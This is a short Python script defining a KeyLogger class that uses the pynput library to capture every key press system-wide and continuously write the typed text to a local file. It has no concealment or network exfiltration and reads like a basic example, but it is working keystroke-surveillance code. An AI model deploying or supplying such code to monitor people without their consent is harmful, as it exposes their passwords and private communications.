from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.current_text = ""

    def on_press(self, key):
        try:
            self.current_text += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.current_text += " "
            elif key == keyboard.Key.backspace:
                self.current_text = self.current_text[:-1]
            elif key == keyboard.Key.enter:
                self.current_text += "\n"

        # Write the current text to a file
        with open("current_text.txt", "w") as file:
            file.write(self.current_text)

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
